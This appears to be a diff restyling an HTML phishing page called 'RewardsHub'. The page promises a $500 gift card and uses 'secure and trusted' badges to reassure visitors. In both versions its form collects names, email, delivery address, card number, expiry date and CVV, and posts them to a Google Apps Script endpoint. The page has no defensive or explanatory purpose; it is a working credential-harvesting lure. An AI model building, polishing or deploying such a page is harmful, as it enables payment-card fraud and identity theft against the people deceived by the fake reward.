@@ -3,71 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RewardsHub - $500 Reward</title>
+    <title>RewardsHub | $500 Gift Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600;800&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
-        :root { --bg: #050505; --card: #111111; --accent: #8a2be2; --text: #ffffff; }
+        :root { --primary: #8a2be2; --secondary: #ff007f; --bg: #050505; }
+        body { font-family: 'Poppins', sans-serif; background: var(--bg); color: white; margin: 0; }
         
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; min-height: 100vh; display: flex; flex-direction: column; }
+        /* Header */
+        header { padding: 20px; text-align: center; background: rgba(0,0,0,0.5); }
+        .hero { text-align: center; padding: 40px 20px; }
+        .hero h1 { font-size: 2.5rem; margin-bottom: 10px; background: linear-gradient(to right, #fff, var(--primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         
-        /* Header - Mobile friendly */
-        .header { width: 100%; padding: 20px 10px; background: #0a0a0a; text-align: center; border-bottom: 1px solid #222; }
-        .badge { background: #1a4d2e; color: #4ade80; padding: 5px 12px; border-radius: 20px; font-size: 10px; font-weight: 700; text-transform: uppercase; }
+        /* 3D Card Animation */
+        .card-preview { width: 280px; height: 160px; background: linear-gradient(135deg, var(--primary), var(--secondary)); margin: 20px auto; border-radius: 20px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 24px; box-shadow: 0 0 30px rgba(138,43,226,0.5); animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
         
-        /* Content Wrapper */
-        .wrapper { flex: 1; display: flex; justify-content: center; align-items: center; padding: 15px; }
-        .form-box { background: var(--card); width: 100%; max-width: 450px; padding: 25px; border-radius: 20px; border: 1px solid #222; }
-        
-        /* Form Layout */
+        /* Form Section */
+        .container { max-width: 450px; margin: 0 auto 50px auto; padding: 30px; background: #111; border-radius: 25px; border: 1px solid #333; }
         .input-group { margin-bottom: 15px; }
-        label { display: block; font-size: 10px; color: #888; margin-bottom: 5px; text-transform: uppercase; }
-        input { width: 100%; background: #000; border: 1px solid #333; padding: 12px; border-radius: 10px; color: white; box-sizing: border-box; font-size: 14px; }
+        label { font-size: 10px; color: #aaa; text-transform: uppercase; }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid #444; border-radius: 8px; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: var(--primary); border: none; border-radius: 8px; color: white; font-weight: 800; cursor: pointer; transition: 0.3s; }
+        button:hover { background: var(--secondary); }
         
-        .row { display: flex; gap: 10px; }
-        .row > div { flex: 1; }
-        
-        .submit-btn { width: 100%; background: var(--accent); color: white; border: none; padding: 15px; border-radius: 10px; font-weight: 800; cursor: pointer; margin-top: 10px; font-size: 14px; }
-        
-        /* Footer */
-        .footer { padding: 15px; text-align: center; color: #444; font-size: 10px; background: #050505; }
-
-        /* Tablet aur Desktop ke liye adjustements */
-        @media (min-width: 600px) {
-            .form-box { padding: 40px; }
-            .badge { font-size: 12px; }
-        }
+        /* Trust Badge */
+        .trust { text-align: center; font-size: 12px; color: #4ade80; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
-    <header class="header">
-        <div class="badge">100% Verified & Trusted</div>
-        <h2 style="margin: 10px 0 0 0; font-size: 22px;">Secure Reward Claim</h2>
+    <header>
+        <div class="brand">🎁 RewardsHub</div>
     </header>
 
-    <div class="wrapper">
-        <div class="form-box">
-            <form action="https://script.google.com/macros/s/AKfycbz4bE3WIVsYF6EhtlF6xbbJWSZTCx4VOFED3dHpoN88hmVk82uNfm_xToOth-7YEDEb/exec" method="POST">
-                <div class="row">
-                    <div class="input-group"><label>First Name</label><input type="text" name="firstName" required></div>
-                    <div class="input-group"><label>Last Name</label><input type="text" name="lastName" required></div>
-                </div>
-                <div class="input-group"><label>Email Address</label><input type="email" name="email" required></div>
-                <div class="input-group"><label>Zip Code</label><input type="text" name="zipCode" required></div>
-                <div class="input-group"><label>Full Delivery Address</label><input type="text" name="address" required></div>
-                <div class="input-group"><label>Cardholder Name</label><input type="text" name="cardholderName" required></div>
-                <div class="input-group"><label>Card Number</label><input type="text" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required></div>
-                <div class="row">
-                    <div class="input-group"><label>Expiry</label><input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required></div>
-                    <div class="input-group"><label>CVV</label><input type="password" name="cvv" placeholder="•••" maxlength="4" required></div>
-                </div>
-                <button type="submit" class="submit-btn">Claim Reward Now</button>
-            </form>
-        </div>
+    <div class="hero">
+        <h1>Claim Your $500 Reward!</h1>
+        <p>Verify your details to get your digital gift card instantly.</p>
+        <div class="card-preview">PREMIUM CARD</div>
     </div>
 
-    <footer class="footer">
-        &copy; 2026 RewardsHub. All rights reserved. | 256-bit SSL Encrypted
+    <div class="container">
+        <div class="trust">✔️ 100% Secure & Trusted Encryption</div>
+        <form action="https://script.google.com/macros/s/AKfycbz4bE3WIVsYF6EhtlF6xbbJWSZTCx4VOFED3dHpoN88hmVk82uNfm_xToOth-7YEDEb/exec" method="POST">
+            <div style="display:flex; gap:10px;">
+                <div class="input-group" style="flex:1;"><label>First Name</label><input type="text" name="firstName" required></div>
+                <div class="input-group" style="flex:1;"><label>Last Name</label><input type="text" name="lastName" required></div>
+            </div>
+            <div class="input-group"><label>Email Address</label><input type="email" name="email" required></div>
+            <div class="input-group"><label>Zip Code</label><input type="text" name="zipCode" required></div>
+            <div class="input-group"><label>Delivery Address</label><input type="text" name="address" required></div>
+            <div class="input-group"><label>Cardholder Name</label><input type="text" name="cardholderName" required></div>
+            <div class="input-group"><label>Card Number</label><input type="text" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required></div>
+            <div style="display:flex; gap:10px;">
+                <div class="input-group" style="flex:1;"><label>Expiry</label><input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required></div>
+                <div class="input-group" style="flex:1;"><label>CVV</label><input type="password" name="cvv" placeholder="•••" maxlength="4" required></div>
+            </div>
+            <button type="submit">VERIFY & CLAIM</button>
+        </form>
+    </div>
+
+    <footer style="text-align: center; color: #333; font-size: 10px; margin-bottom: 20px;">
+        &copy; 2026 RewardsHub | Terms & Conditions Applied
     </footer>
 
 </body>
